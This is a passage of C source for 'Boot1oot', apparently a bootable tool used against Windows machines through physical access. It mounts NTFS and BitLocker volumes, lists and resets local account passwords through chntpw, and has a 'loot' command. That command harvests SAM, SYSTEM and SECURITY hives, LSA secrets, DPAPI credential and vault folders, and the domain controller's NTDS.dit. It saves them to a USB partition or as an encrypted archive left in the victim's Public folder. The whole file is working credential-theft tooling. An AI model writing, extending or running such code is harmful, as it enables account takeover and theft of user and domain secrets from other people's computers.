	char sam_copy[] = "/tmp/boot1oot-SAM";
	char *const argv[] = {
		"chntpw",
		"-l",
		sam_copy,
		NULL,
	};

	if (ensure_chntpw_sam(mountpoint, sizeof(mountpoint), MOUNT_READ_ONLY,
			      sam_path, sizeof(sam_path)) != 0)
		return 1;

	if (run_reged_export(sam_path, "HKEY_LOCAL_MACHINE\\SAM",
			     "\\SAM\\Domains\\Account\\Users",
			     "/tmp/boot1oot-sam-users.reg") != 0) {
		print_fail("users failed: reged could not export SAM users");
		return 1;
	}
	if (run_reged_export(sam_path, "HKEY_LOCAL_MACHINE\\SAM",
			     "\\SAM\\Domains\\Builtin\\Aliases",
			     "/tmp/boot1oot-sam-builtin-aliases.reg") != 0)
		print_fail("users: optional Builtin Aliases export failed");
	if (run_reged_export(sam_path, "HKEY_LOCAL_MACHINE\\SAM",
			     "\\SAM\\Domains\\Account\\Aliases",
			     "/tmp/boot1oot-sam-account-aliases.reg") != 0)
		print_fail("users: optional Account Aliases export failed");

	print_info("users: reged exports written under /tmp/boot1oot-sam-*.reg");
	if (copy_file(sam_path, sam_copy) != 0)
		return 1;

	print_info("users: copied SAM to %s for read-only decoding", sam_copy);
	print_info("users: decoded SAM table follows; *BLANK* means no NT password hash");
	return run_sbin_program(argv);
}

static int prompt_chntpw_username(char *username, size_t username_len)
{
	char *start;
	char *end;

	fputs("chntpw user> ", stdout);
	fflush(stdout);

	if (!fgets(username, username_len, stdin))
		return -1;

	start = username;
	while (*start == ' ' || *start == '\t')
		start++;

	end = start + strlen(start);
	while (end > start &&
	       (end[-1] == '\n' || end[-1] == '\r' || end[-1] == ' ' || end[-1] == '\t')) {
		end--;
		*end = '\0';
	}

	if (start != username)
		memmove(username, start, strlen(start) + 1);

	return username[0] ? 0 : -1;
}

static int run_chntpw_edit(const char *username)
{
	char mountpoint[256];
	char sam_path[256];
	char system_path[256];
	char security_path[256];
	char *const argv[] = {
		"chntpw",
		"-u",
		(char *)username,
		sam_path,
		system_path,
		security_path,
		NULL,
	};

	if (ensure_chntpw_hives(mountpoint, sizeof(mountpoint), MOUNT_READ_WRITE,
				sam_path, sizeof(sam_path),
				system_path, sizeof(system_path),
				security_path, sizeof(security_path)) != 0)
		return 1;

	if (ensure_file_writable(sam_path) != 0) {
		print_fail("chntpw: SAM hive is not writable: %s", strerror(errno));
		print_fail("chntpw: run 'boot1oot unmount' and then 'boot1oot mount -rw'");
		return 1;
	}

	print_info("chntpw: launching interactive editor for local SAM user '%s'", username);
	return run_sbin_program(argv);
}

static int run_chntpw(int argc, char **argv)
{
	char username[128];

	(void)argv;

	if (ensure_runtime_filesystems() != 0) {
		print_fail("chntpw failed: runtime filesystem setup failed");
		return 1;
	}

	if (argc != 2)
		return 2;

	if (run_chntpw_list(MOUNT_READ_WRITE) != 0)
		return 1;

	if (prompt_chntpw_username(username, sizeof(username)) != 0) {
		print_fail("chntpw failed: no user selected");
		return 1;
	}

	return run_chntpw_edit(username);
}

static int mountpoint_source(const char *mountpoint, char *source, size_t source_len)
{
	FILE *fp;
	char line[512];

	fp = fopen("/proc/mounts", "r");
	if (!fp)
		return -1;

	while (fgets(line, sizeof(line), fp)) {
		char src[128];
		char dst[128];

		if (sscanf(line, "%127s %127s %*s %*s %*d %*d", src, dst) != 2)
			continue;

		if (strcmp(dst, mountpoint) == 0) {
			snprintf(source, source_len, "%s", src);
			fclose(fp);
			return 0;
		}
	}

	fclose(fp);
	return -1;
}

static int is_loot_partition_mounted(void)
{
	char source[128];

	return mountpoint_source(LOOT_MOUNTPOINT, source, sizeof(source)) == 0;
}

static int loot_sentinel_exists(void)
{
	char path[128];

	snprintf(path, sizeof(path), "%s/%s", LOOT_MOUNTPOINT, LOOT_SENTINEL);
	return path_exists(path);
}

static int mount_loot_candidate(const char *dev)
{
	const char *ro_data = "utf8=1,shortname=mixed";
	const char *rw_data = "utf8=1,shortname=mixed,flush";

	if (mount(dev, LOOT_MOUNTPOINT, "vfat", MS_RDONLY | MS_NOATIME, ro_data) != 0)
		return 1;

	if (!loot_sentinel_exists()) {
		umount2(LOOT_MOUNTPOINT, 0);
		return 1;
	}

	umount2(LOOT_MOUNTPOINT, 0);
	if (mount(dev, LOOT_MOUNTPOINT, "vfat", MS_NOATIME | MS_SYNCHRONOUS, rw_data) == 0) {
		print_success("loot mounted: %s -> %s", dev, LOOT_MOUNTPOINT);
		return 0;
	}

	print_fail("loot: found Boot1oot loot partition at %s but could not mount read-write: %s",
		   dev, strerror(errno));
	return 1;
}

static int run_loot_mount(void)
{
	FILE *fp;
	char line[256];
	int attempted = 0;

	if (ensure_runtime_filesystems() != 0) {
		print_fail("loot failed: runtime filesystem setup failed");
		return 1;
	}

	if (ensure_dir(LOOT_MOUNTPOINT, 0755) != 0) {
		print_fail("loot failed: cannot create %s: %s", LOOT_MOUNTPOINT, strerror(errno));
		return 1;
	}

	if (is_loot_partition_mounted()) {
		if (loot_sentinel_exists()) {
			print_success("loot already mounted at %s", LOOT_MOUNTPOINT);
			return 0;
		}
		print_fail("loot failed: %s is mounted but is not a Boot1oot loot partition",
			   LOOT_MOUNTPOINT);
		return 1;
	}

	fp = fopen("/proc/partitions", "r");
	if (!fp) {
		print_fail("loot failed: cannot read /proc/partitions: %s", strerror(errno));
		return 1;
	}

	while (fgets(line, sizeof(line), fp)) {
		unsigned int major;
		unsigned int minor;
		unsigned long long blocks;
		char name[DEV_NAME_MAX];
		char dev[DEV_NAME_MAX + 6];

		if (sscanf(line, " %u %u %llu %63s", &major, &minor, &blocks, name) != 4)
			continue;

		if (strncmp(name, "loop", 4) == 0 || strncmp(name, "ram", 3) == 0 ||
		    strncmp(name, "sr", 2) == 0)
			continue;

		snprintf(dev, sizeof(dev), "/dev/%s", name);
		attempted++;
		if (mount_loot_candidate(dev) == 0) {
			fclose(fp);
			return 0;
		}
	}

	fclose(fp);

	if (attempted == 0)
		print_fail("loot failed: no block devices found to probe");
	else
		print_fail("loot failed: no Boot1oot loot partition found");

	return 1;
}

struct loot_stats {
	int copied;
	int skipped;
	int failed;
};

static int copy_tree_recursive(const char *src, const char *dst, struct loot_stats *stats)
{
	struct stat st;

	if (lstat(src, &st) != 0)
		return -1;

	if (S_ISDIR(st.st_mode)) {
		DIR *dir;
		struct dirent *entry;
		int failed = 0;

		if (ensure_parent_dirs(dst) != 0) {
			print_fail("loot: cannot create %s: %s", dst, strerror(errno));
			stats->failed++;
			return -1;
		}

		dir = opendir(src);
		if (!dir) {
			print_fail("loot: cannot read %s: %s", src, strerror(errno));
			stats->failed++;
			return -1;
		}

		while ((entry = readdir(dir)) != NULL) {
			char child_src[512];
			char child_dst[512];

			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
				continue;

			snprintf(child_src, sizeof(child_src), "%s/%s", src, entry->d_name);
			snprintf(child_dst, sizeof(child_dst), "%s/%s", dst, entry->d_name);
			if (copy_tree_recursive(child_src, child_dst, stats) != 0)
				failed = 1;
		}

		closedir(dir);
		return failed ? -1 : 0;
	}

	if (S_ISREG(st.st_mode)) {
		if (copy_file(src, dst) == 0) {
			stats->copied++;
			return 0;
		}
		stats->failed++;
		return -1;
	}

	stats->skipped++;
	return 0;
}

static int loot_copy_relative(const char *windows_root, const char *relative,
			      const char *stage, struct loot_stats *stats)
{
	char src[512];
	char dst[512];

	snprintf(src, sizeof(src), "%s/%s", windows_root, relative);
	if (!path_exists(src))
		return 0;

	snprintf(dst, sizeof(dst), "%s/windows/%s", stage, relative);
	print_info("loot: collect %s", relative);
	return copy_tree_recursive(src, dst, stats);
}

static void loot_collect_user_profile(const char *windows_root, const char *user,
				      const char *stage, struct loot_stats *stats)
{
	const char *items[] = {
		"NTUSER.DAT",
		"AppData/Local/Microsoft/Credentials",
		"AppData/Local/Microsoft/Protect",
		"AppData/Local/Microsoft/Vault",
		"AppData/Roaming/Microsoft/Credentials",
		"AppData/Roaming/Microsoft/Crypto",
		"AppData/Roaming/Microsoft/Protect",
		"AppData/Roaming/Microsoft/SystemCertificates",
		"AppData/Roaming/Microsoft/Vault",
		"AppData/Local/Microsoft/Windows/UsrClass.dat",
		NULL,
	};
	size_t i;

	for (i = 0; items[i]; i++) {
		char rel[256];

		snprintf(rel, sizeof(rel), "Users/%s/%s", user, items[i]);
		loot_copy_relative(windows_root, rel, stage, stats);
	}
}

static void loot_collect_user_profiles(const char *windows_root, const char *stage,
				       struct loot_stats *stats)
{
	char users_dir[512];
	DIR *dir;
	struct dirent *entry;

	snprintf(users_dir, sizeof(users_dir), "%s/Users", windows_root);
	dir = opendir(users_dir);
	if (!dir)
		return;

	while ((entry = readdir(dir)) != NULL) {
		char profile_path[512];
		struct stat st;

		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		snprintf(profile_path, sizeof(profile_path), "%s/%s", users_dir, entry->d_name);
		if (stat(profile_path, &st) != 0 || !S_ISDIR(st.st_mode))
			continue;

		loot_collect_user_profile(windows_root, entry->d_name, stage, stats);
	}

	closedir(dir);
}

static int write_loot_manifest(const char *stage, const char *windows_root)
{
	char path[512];
	FILE *fp;
	time_t now = time(NULL);

	snprintf(path, sizeof(path), "%s/MANIFEST.txt", stage);
	if (ensure_file_parent_dirs(path) != 0)
		return -1;

	fp = fopen(path, "w");
	if (!fp)
		return -1;

	fprintf(fp, "Boot1oot offline loot collection\n");
	fprintf(fp, "source_root=%s\n", windows_root);
	fprintf(fp, "unix_time=%lld\n", (long long)now);
	fprintf(fp, "\nCollected classes:\n");
	fprintf(fp, "- Registry hives: SAM, SYSTEM, SECURITY, SOFTWARE, DEFAULT, transaction logs, RegBack\n");
	fprintf(fp, "- LSA secrets at rest: SECURITY hive with SYSTEM bootkey material\n");
	fprintf(fp, "- DPAPI material: user and machine Protect/Credentials/Vault/Crypto paths\n");
	fprintf(fp, "- Domain controller database if present: Windows/NTDS/NTDS.dit\n");
	fclose(fp);
	return 0;
}

static int collect_offline_loot(const char *windows_root, const char *stage)
{
	const char *system_items[] = {
		"Windows/System32/config/SAM",
		"Windows/System32/config/SAM.LOG1",
		"Windows/System32/config/SAM.LOG2",
		"Windows/System32/config/SYSTEM",
		"Windows/System32/config/SYSTEM.LOG1",
		"Windows/System32/config/SYSTEM.LOG2",
		"Windows/System32/config/SECURITY",
		"Windows/System32/config/SECURITY.LOG1",
		"Windows/System32/config/SECURITY.LOG2",
		"Windows/System32/config/SOFTWARE",
		"Windows/System32/config/SOFTWARE.LOG1",
		"Windows/System32/config/SOFTWARE.LOG2",
		"Windows/System32/config/DEFAULT",
		"Windows/System32/config/DEFAULT.LOG1",
		"Windows/System32/config/DEFAULT.LOG2",
		"Windows/System32/config/RegBack",
		"Windows/System32/Microsoft/Protect",
		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials",
		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Crypto",
		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Protect",
		"Windows/System32/config/systemprofile/AppData/Local/Microsoft/Vault",
		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Credentials",
		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Crypto",
		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Protect",
		"Windows/System32/config/systemprofile/AppData/Roaming/Microsoft/Vault",
		"ProgramData/Microsoft/Crypto",
		"ProgramData/Microsoft/Protect",
		"ProgramData/Microsoft/Vault",
		"Windows/NTDS/NTDS.dit",
		NULL,
	};
	struct loot_stats stats = { 0, 0, 0 };
	size_t i;

	if (ensure_parent_dirs(stage) != 0) {
		print_fail("loot failed: cannot create stage %s: %s", stage, strerror(errno));
		return 1;
	}

	write_loot_manifest(stage, windows_root);
	for (i = 0; system_items[i]; i++)
		loot_copy_relative(windows_root, system_items[i], stage, &stats);
	loot_collect_user_profiles(windows_root, stage, &stats);

	print_info("loot: staged %d file(s), skipped %d special item(s), %d failure(s)",
		   stats.copied, stats.skipped, stats.failed);
	if (stats.copied == 0 || stats.failed > 0)
		return 1;

	return 0;
}

static void make_loot_id(char *out, size_t out_len)
{
	time_t now = time(NULL);

	snprintf(out, out_len, "boot1oot-loot-%lld-%ld", (long long)now, (long)getpid());
}

static int store_loot_on_usb(const char *stage, const char *loot_id)
{
	char dest[512];
	struct loot_stats stats = { 0, 0, 0 };
	int rc;
	int unmount_failed = 0;

	if (run_loot_mount() != 0)
		return 1;

	snprintf(dest, sizeof(dest), "%s/%s", LOOT_MOUNTPOINT, loot_id);
	print_info("loot: writing staged collection to %s", dest);
	rc = copy_tree_recursive(stage, dest, &stats);

	chdir("/");
	if (umount2(LOOT_MOUNTPOINT, 0) == 0)
		print_success("loot: unmounted %s", LOOT_MOUNTPOINT);
	else {
		print_fail("loot: could not unmount %s: %s", LOOT_MOUNTPOINT, strerror(errno));
		unmount_failed = 1;
	}

	if (rc == 0 && stats.failed == 0 && !unmount_failed) {
		print_success("loot saved to USB: %s", dest);
		return 0;
	}

	print_fail("loot: USB write failed");
	return 1;
}

static int create_encrypted_loot_archive(const char *loot_id, char *archive_path,
					 size_t archive_path_len)
{
	const char *passphrase = configured_loot_passphrase();
	char tar_path[256];
	char iter[] = "200000";
	char *tar_argv[] = {
		"tar",
		"-C",
		"/tmp",
		"-cf",
		tar_path,
		(char *)loot_id,
		NULL,
	};
	char *openssl_argv[] = {
		"openssl",
		"enc",
		"-aes-256-cbc",
		"-salt",
		"-pbkdf2",
		"-iter",
		iter,
		"-pass",
		"env:" BOOT1OOT_LOOT_PASSPHRASE_ENV,
		"-in",
		tar_path,
		"-out",
		archive_path,
		NULL,
	};

	if (!passphrase) {
		print_fail("loot fallback failed: set %s before writing secrets to Windows",
			   BOOT1OOT_LOOT_PASSPHRASE_ENV);
		return 1;
	}

	snprintf(tar_path, sizeof(tar_path), "/tmp/%s.tar", loot_id);
	snprintf(archive_path, archive_path_len, "/tmp/%s.tar.enc", loot_id);
	unlink(tar_path);
	unlink(archive_path);

	print_info("loot fallback: creating tar archive");
	if (run_program(tar_argv) != 0) {
		print_fail("loot fallback failed: tar could not create %s", tar_path);
		return 1;
	}

	setenv(BOOT1OOT_LOOT_PASSPHRASE_ENV, passphrase, 1);
	print_info("loot fallback: encrypting archive with openssl aes-256-cbc pbkdf2");
	if (run_program(openssl_argv) != 0) {
		print_fail("loot fallback failed: openssl encryption failed");
		return 1;
	}

	unlink(tar_path);
	return 0;
}

static int find_or_mount_windows_root_for_loot(char *mountpoint, size_t mountpoint_len,
					       enum mount_mode mode)
{
	int rc;

	rc = find_mounted_windows_root(mountpoint, mountpoint_len);
	if (rc == 2) {
		print_info("loot: no mounted Windows root found; attempting automatic %s mount",
			   mount_mode_name(mode));
		if (scan_and_mount_windows(mode) != 0)
			return 1;
		rc = find_mounted_windows_root(mountpoint, mountpoint_len);
	}

	return rc == 0 ? 0 : 1;
}

static int run_unmount(void);

static int copy_archive_to_windows_public(const char *archive_path, const char *loot_id)
{
	char mountpoint[256];
	char public_dir[512];
	char dest[512];

	if (find_or_mount_windows_root_for_loot(mountpoint, sizeof(mountpoint),
						MOUNT_READ_WRITE) != 0)
		return 1;

	snprintf(public_dir, sizeof(public_dir), "%s/%s", mountpoint, LOOT_PUBLIC_DIR);
	snprintf(dest, sizeof(dest), "%s/%s.tar.enc", public_dir, loot_id);
	if (ensure_parent_dirs(public_dir) == 0 && copy_file(archive_path, dest) == 0) {
		print_success("loot fallback saved encrypted archive: %s", dest);
		return 0;
	}

	print_info("loot fallback: retrying with a fresh read-write Windows mount");
	run_unmount();
	if (scan_and_mount_windows(MOUNT_READ_WRITE) != 0)
		return 1;
	if (find_mounted_windows_root(mountpoint, sizeof(mountpoint)) != 0)
		return 1;

	snprintf(public_dir, sizeof(public_dir), "%s/%s", mountpoint, LOOT_PUBLIC_DIR);
	snprintf(dest, sizeof(dest), "%s/%s.tar.enc", public_dir, loot_id);
	if (ensure_parent_dirs(public_dir) != 0 || copy_file(archive_path, dest) != 0) {
		print_fail("loot fallback failed: could not write %s", dest);
		return 1;
	}

	print_success("loot fallback saved encrypted archive: %s", dest);
	return 0;
}

static int run_loot(int argc, char **argv)
{
	char mountpoint[256];
	char loot_id[96];
	char stage[160];
	char archive_path[256];

	(void)argv;

	if (argc != 2)
		return 2;

	if (ensure_runtime_filesystems() != 0) {
		print_fail("loot failed: runtime filesystem setup failed");
		return 1;
	}

	if (find_or_mount_windows_root_for_loot(mountpoint, sizeof(mountpoint),
						MOUNT_READ_ONLY) != 0) {
		print_fail("loot failed: no Windows root available");
		return 1;
	}

	make_loot_id(loot_id, sizeof(loot_id));
	snprintf(stage, sizeof(stage), "/tmp/%s", loot_id);
	print_info("loot: staging offline artifacts from %s", mountpoint);
	if (collect_offline_loot(mountpoint, stage) != 0)
		return 1;

	if (store_loot_on_usb(stage, loot_id) == 0)
		return 0;

	print_info("loot: USB loot storage unavailable; using encrypted Windows fallback");
	if (create_encrypted_loot_archive(loot_id, archive_path, sizeof(archive_path)) != 0)
		return 1;

	return copy_archive_to_windows_public(archive_path, loot_id);
}

static int unmount_children(const char *root)
{
	DIR *dir;
	struct dirent *entry;
	int attempted = 0;
	int failed = 0;

	dir = opendir(root);
	if (!dir) {
		if (errno == ENOENT)
			return 0;

		print_fail("unmount failed: cannot open %s: %s", root, strerror(errno));
		return 1;
	}

	while ((entry = readdir(dir)) != NULL) {
		char path[256];
		struct stat st;

		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
			continue;

		snprintf(path, sizeof(path), "%s/%s", root, entry->d_name);
		if (stat(path, &st) != 0 || !S_ISDIR(st.st_mode))
			continue;

		attempted++;
		print_info("unmount: %s", path);
		if (umount2(path, 0) == 0) {
			print_success("unmount success: %s", path);
			continue;
		}

		if (errno == EINVAL) {
			print_info("unmount: %s was not mounted", path);
			continue;
		}

		if (errno == EBUSY) {
			print_fail("unmount failed: %s is busy; cd / and close any shell using it", path);
			failed++;
			continue;
		}

		print_fail("unmount failed: %s: %s", path, strerror(errno));
		failed++;
	}

	closedir(dir);

	if (attempted == 0)
		print_info("unmount: no mount directories under %s", root);

	return failed ? 1 : 0;
}

static int run_unmount(void)
{
	int failed = 0;

	if (ensure_runtime_filesystems() != 0) {
		print_fail("unmount failed: runtime filesystem setup failed");
		return 1;
	}

	chdir("/");

	print_info("unmount: Windows NTFS mountpoints");
	failed += unmount_children(WIN_MOUNT_ROOT);

	print_info("unmount: dislocker FUSE mountpoints");
	failed += unmount_children(DISLOCKER_MOUNTPOINT);

	print_info("unmount: persistent loot mountpoint");
	if (umount2(LOOT_MOUNTPOINT, 0) == 0)
		print_success("unmount success: %s", LOOT_MOUNTPOINT);
	else if (errno == EINVAL)
		print_info("unmount: %s was not mounted", LOOT_MOUNTPOINT);
	else if (errno == EBUSY) {
		print_fail("unmount failed: %s is busy; cd / and close any shell using it",
			   LOOT_MOUNTPOINT);
		failed++;
	} else {
		print_fail("unmount failed: %s: %s", LOOT_MOUNTPOINT, strerror(errno));
		failed++;
	}

	if (failed) {
		print_fail("unmount failed: one or more mountpoints are still active");
		return 1;
	}

	print_success("unmount complete");
	return 0;
}

static int parse_mount_mode(int argc, char **argv, enum mount_mode *mode)
{
	*mode = MOUNT_READ_ONLY;

	if (argc == 2)
		return 0;

	if (argc != 3)
		return -1;

	if (strcmp(argv[2], "-r") == 0 || strcmp(argv[2], "--read-only") == 0) {
		*mode = MOUNT_READ_ONLY;
		return 0;
	}

	if (strcmp(argv[2], "-rw") == 0 || strcmp(argv[2], "--read-write") == 0) {
		*mode = MOUNT_READ_WRITE;
		return 0;
	}

	return -1;
}

static int active_console_path(char *path, size_t path_len)
{
	char active[128];
	char *token;
	char *chosen = NULL;
	ssize_t got;
	int fd;

	fd = open("/sys/class/tty/console/active", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		goto fallback;

	got = read(fd, active, sizeof(active) - 1);
	close(fd);
	if (got <= 0)
		goto fallback;

	active[got] = '\0';
	for (token = strtok(active, " \t\r\n"); token; token = strtok(NULL, " \t\r\n")) {
		chosen = token;
		if (strcmp(token, "tty0") == 0) {
			chosen = "tty1";
			break;
		}
	}

	if (chosen && snprintf(path, path_len, "/dev/%s", chosen) < (int)path_len)
		return 0;

fallback:
	if (snprintf(path, path_len, "/dev/console") >= (int)path_len)
		return -1;
	return 0;
}

static int setup_controlling_terminal(void)
{
	char path[64];
	int fd;
	int flags;

	fd = open("/dev/tty", O_RDWR | O_CLOEXEC);
	if (fd >= 0) {
		close(fd);
		return 0;
	}

	if (active_console_path(path, sizeof(path)) != 0)
		return -1;

	if (setsid() != 0 && errno != EPERM)
		return -1;

	fd = open(path, O_RDWR | O_NONBLOCK);
	if (fd < 0 && strcmp(path, "/dev/console") != 0)
		fd = open("/dev/console", O_RDWR | O_NONBLOCK);
	if (fd < 0)
		return -1;

	(void)ioctl(fd, TIOCSCTTY, 1);
	flags = fcntl(fd, F_GETFL);
	if (flags >= 0)
		(void)fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);

	dup2(fd, STDIN_FILENO);
	dup2(fd, STDOUT_FILENO);
	dup2(fd, STDERR_FILENO);
	if (fd > STDERR_FILENO)
		close(fd);

	return 0;
}

static int run_init(void)
{
	char *const bash_argv[] = { "bash", "--rcfile", "/etc/boot1oot.bashrc", "-i", NULL };
	char *const sh_argv[] = { "sh", "-i", NULL };

	sethostname("boot1oot", strlen("boot1oot"));
	setenv("HOME", "/root", 1);
	setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin", 1);
	setenv("PS1", "\\w/ \\h$ ", 1);
	if (BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY[0])
		setenv(BOOT1OOT_RECOVERY_KEY_ENV, BOOT1OOT_BUILTIN_BITLOCKER_RECOVERY_KEY, 0);
	chdir("/root");

	ensure_runtime_filesystems();
	if (setup_controlling_terminal() != 0)
		fprintf(stderr, "init: warning: cannot claim controlling terminal: %s\n", strerror(errno));
	print_banner();
	print_usage(stdout);
	puts("");
	fflush(stdout);

	execv("/usr/bin/bash", bash_argv);
	execv("/bin/bash", bash_argv);
	execv("/bin/sh", sh_argv);
	fprintf(stderr, "failed to exec shell: %s\n", strerror(errno));
	return 127;
}

int main(int argc, char **argv)
{
	enum mount_mode mode;

	if (argc < 2) {
		print_usage(stderr);
		return 2;
	}

	if (strcmp(argv[1], "mount") == 0) {
		if (parse_mount_mode(argc, argv, &mode) != 0) {
			print_usage(stderr);
			return 2;
		}
		return scan_and_mount_windows(mode);
	}

	if (strcmp(argv[1], "dislocker") == 0) {
		if (parse_mount_mode(argc, argv, &mode) != 0) {
			print_usage(stderr);
			return 2;
		}
		return run_dislocker_mount(mode);
	}

	if (strcmp(argv[1], "scan") == 0 && argc == 2)
		return scan_only();

	if (strcmp(argv[1], "users") == 0 && argc == 2)
		return run_chntpw_users();

	if (strcmp(argv[1], "chntpw") == 0) {
		int rc = run_chntpw(argc, argv);

		if (rc == 2)
			print_usage(stderr);
		return rc;
	}

	if (strcmp(argv[1], "loot") == 0) {
		int rc = run_loot(argc, argv);

		if (rc == 2)
			print_usage(stderr);
		return rc;
	}

	if (strcmp(argv[1], "unmount") == 0 && argc == 2)
		return run_unmount();

	if (strcmp(argv[1], "init") == 0 && argc == 2)
		return run_init();

	fprintf(stderr, "unknown command: %s\n\n", argv[1]);
	print_usage(stderr);
	return 2;
}
